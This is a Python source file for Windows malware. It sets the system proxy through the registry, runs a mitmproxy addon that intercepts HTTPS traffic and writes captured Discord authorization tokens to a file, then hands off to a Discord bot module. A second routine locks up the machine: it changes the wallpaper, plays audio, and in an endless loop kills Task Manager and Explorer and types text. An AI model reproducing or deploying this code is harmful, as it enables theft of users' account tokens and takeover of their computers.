import threading
import time
import asyncio
import os
import logging
import DiscordManager
import LaunchingUkrainizaciya
# ---------------------ProxySetup---------------------
import winreg as reg

# ----------------------------------------------------
# ---------------------tokengraber---------------------
import time

from mitmproxy import options
from mitmproxy.tools.dump import DumpMaster
import asyncio
import logging
from mitmproxy.addonmanager import Loader

# -----------------------------------------------------
# ------------------------LaunchingUkrainizaciya---------------
import time
import keyboard
import threading
import urllib3
import os
import win32security
import win32api
import win32con
import pyautogui
from ImageController import ImageController
from ProcessController import ProcessController
from WindowsController import WindowsController

# ---------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("requests.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


# ---------------------ProxySetup---------------------
class ProxySetup:
    def __init__(self):
        ...

    @classmethod
    def set_proxy(cls, proxy) -> None:
        internet_settings = reg.OpenKey(reg.HKEY_CURRENT_USER,
                                        r'Software\Microsoft\Windows\CurrentVersion\Internet Settings',
                                        0, reg.KEY_ALL_ACCESS)

        reg.SetValueEx(internet_settings, 'ProxyServer', 0, reg.REG_SZ, proxy)
        reg.SetValueEx(internet_settings, 'ProxyEnable', 0, reg.REG_DWORD, 1)

        reg.CloseKey(internet_settings)

    @classmethod
    def deactivate_proxy(cls) -> None:
        internet_settings = reg.OpenKey(reg.HKEY_CURRENT_USER,
                                        r'Software\Microsoft\Windows\CurrentVersion\Internet Settings',
                                        0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(internet_settings, 'ProxyEnable', 0, reg.REG_DWORD, 0)

        reg.CloseKey(internet_settings)


# --------------------------------------------------------

# ---------------------tokengraber---------------------

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("requests.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)
finished = False


class RequestLogger:
    def load(self, loader: Loader):
        loader.add_option(
            name="listen_host", typespec=str, default="127.0.0.1",
            help="Proxy listen address"
        )
        loader.add_option(
            name="listen_port", typespec=int, default=8080,
            help="Proxy listen port"
        )

    def request(self, flow):
        global finished
        request = flow.request
        for header, value in request.headers.items():
            if header == "authorization" and "discord.com" in request.url:
                logger.info("---------------------------------------")
                logger.info(f"DETECTED TOKEN DISCORD: {value}")
                logger.info("---------------------------------------")
                with open("token.txt", "w") as file:
                    file.write(value)
                finished = True
            else:
                logger.info(f"URL: {flow.request.url}")
                logger.info("Request Headers:")
                for key, value in flow.request.headers.items():
                    logger.info(f"{key}: {value}")
                logger.info("\n")


class tokengraber:
    @classmethod
    async def start(cls):
        global finished
        opts = options.Options(listen_host='127.0.0.1', listen_port=8080)
        pconf = opts.keys()
        m = DumpMaster(opts)

        m.addons.add(RequestLogger())

        try:
            asyncio.create_task(m.run())
            while finished == False:
                await asyncio.sleep(1)
            logger.info("Closing TokenGraber Proxy")
            m.shutdown()


        except SystemExit:
            ...


# --------------------------------------------------------
# ------------------------LaunchingUkrainizaciya---------------


def start():
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    image_url = "https://img.freepik.com/free-vector/ukrainian-flag-pattern-vector_53876-162417.jpg"
    music_url = "https://muz8.z3.fm/d/18/gimn_ukraini_-_shche_ne_vmerla_ukrani_(zf.fm).mp3?download=force"
    filename = 'icon.ico'
    image_path = os.path.join(os.getcwd(), "wallpaper.ico")

    current_pid = win32api.GetCurrentProcessId()
    hProcess = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, current_pid)

    # Получаем дескриптор токена процесса
    hToken = win32security.OpenProcessToken(hProcess, win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)

    # Запрещаем выключение компьютера через групповую политику
    SE_SHUTDOWN_NAME = 'SeShutdownPrivilege'
    shutdown_privilege = win32security.LookupPrivilegeValue(None, SE_SHUTDOWN_NAME)
    privileges = [(shutdown_privilege, win32security.SE_PRIVILEGE_ENABLED)]
    win32security.AdjustTokenPrivileges(hToken, False, privileges)

    if ImageController.download_image(image_url, image_path):
        ImageController.set_wallpaper(image_path)
        print("Обои успешно установлены!")
    else:
        print("Не удалось загрузить изображение.")

    music_thread = threading.Thread(target=ImageController.play_music, args=(music_url,))
    image_thread = threading.Thread(target=ImageController.show_image, args=(image_url,))
    restor = threading.Thread(target=WindowsController.restor_window)

    music_thread.start()
    image_thread.start()

    time.sleep(1)
    restor.start()

    while True:
        try:
            while True:
                ProcessController.kill_task_manager()
                ProcessController.kill_explorer_manager()
                pyautogui.moveTo(12, 34, )
                keyboard.write("Украинизация")
        except:
            ...


# ----------------------------------------------------------


# ---------------------StartPoint-------------------------

async def main():
    logger.info("Proxy installation.")

    proxy = "http=localhost:8080;https=localhost:8080"
    ProxySetup.set_proxy(proxy)

    logger.info("The proxy is installed and the settings are saved.")

    await tokengraber.start()

    while os.path.exists("token.txt") == False:
        time.sleep(1)

    logger.info("Deactivating a proxy.")
    ProxySetup.deactivate_proxy()

    logger.info("Starting Discord Bot")


if __name__ == "__main__":
    asyncio.run(main())
    logger.info("Build Thread")
    thread = threading.Thread(target=LaunchingUkrainizaciya.start)
    logger.info("Starting Thread")
    thread.start()
    DiscordManager.Start()
